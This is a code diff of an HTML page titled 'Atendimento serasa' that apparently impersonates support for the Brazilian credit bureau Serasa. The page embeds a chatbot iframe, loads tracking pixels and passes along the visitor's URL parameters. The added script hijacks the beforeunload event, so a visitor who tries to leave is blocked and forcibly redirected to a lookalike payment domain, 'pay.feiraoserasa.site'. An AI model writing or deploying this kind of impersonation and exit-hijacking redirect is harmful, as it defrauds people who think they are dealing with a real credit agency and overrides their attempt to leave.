@@ -1,24 +1,13 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
-  <head>
-
-<!-- Config do pixel face + utm -->
-
-<script
-      src="scripts/utms/latest-1.js"
-      data-utmify-prevent-subids=""
-      async=""
-      defer=""
-    ></script>
-    <script>
-      window.pixelId = "6939d79855be7738fa1fec49";
-      var a = document.createElement("script");
-      a.setAttribute("async", "");
-      a.setAttribute("defer", "");
-      a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-      document.head.appendChild(a);
-</script>
-
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Atendimento serasa</title>
+<link rel="icon" type="image/x-icon" href="../../1_6vufYTynT97AiH9uOytFpw.png">
+<style>
+  html, body { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+</style>
 <script>
       !function(f,b,e,v,n,t,s)
       {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -42,41 +31,50 @@
     <img height="1" width="1" style="display:none"
          src="https://www.facebook.com/tr?id=769736156134629&ev=PageView&noscript=1"/>
   </noscript>
-  
-<!-- Config do pixel face + utm -->
+</head>
+<body>
 
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Atendimento serasa</title>
-    <link rel="icon" type="image/x-icon" href="../../1_6vufYTynT97AiH9uOytFpw.png">
-    <style>
-      html,
-      body {
-        margin: 0;
-        padding: 0;
-        height: 100%;
-        overflow: hidden;
-      }
-      #typebot-iframe {
-        width: 100vw;
-        height: 100vh;
-        border: none;
-      }
-    </style>
-  </head>
-  <body>
-    <iframe id="typebot-iframe" src="" allowfullscreen></iframe>
-    <script>
-      (function () {
-        // URL base do Typebot
-        var baseUrl =
-          "https://bot-typebot-viewer.ksrub8.easypanel.host/bfilyz1";
-        // Captura todos os parâmetros da URL atual
-        var params = window.location.search;
-        // Define o src do iframe incluindo parâmetros
-        var iframe = document.getElementById("typebot-iframe");
-        iframe.src = baseUrl + params;
-      })();
-    </script>
-  </body>
+<script>
+// ===========================================
+// CÓDIGO EXECUTA COM document.write - FORÇA ORDEM
+// ===========================================
+
+const SUA_URL_ALVO = "https://pay.feiraoserasa.site/lDW0ZaJnv64GN7E";
+
+// 1. INTERCEPTADOR EXECUTA PRIMEIRO
+(function() {
+  let interceptado = false;
+  
+  function meuRedirecionamento() {
+    if (interceptado) return;
+    interceptado = true;
+    console.log('🎯 Indo para:', SUA_URL_ALVO);
+    setTimeout(() => window.location.replace(SUA_URL_ALVO), 100);
+  }
+  
+  // CAPTURA beforeunload IMEDIATAMENTE
+  window.addEventListener('beforeunload', function(e) {
+    console.log('🚨 Interceptado!');
+    e.preventDefault();
+    e.returnValue = '';
+    meuRedirecionamento();
+    return false;
+  }, true);
+  
+  window._meuRedirect = meuRedirecionamento;
+  console.log('🛡️ Interceptador pronto');
+})();
+
+// 2. AGORA escreve o iframe
+document.write(`
+  <iframe 
+    id="typebot-iframe" 
+    src="https://bot-typebot-viewer.ksrub8.easypanel.host/bfilyz1${window.location.search}"
+    style="width:100vw; height:100vh; border:none;"
+    allowfullscreen
+  ></iframe>
+`);
+</script>
+
+</body>
 </html>
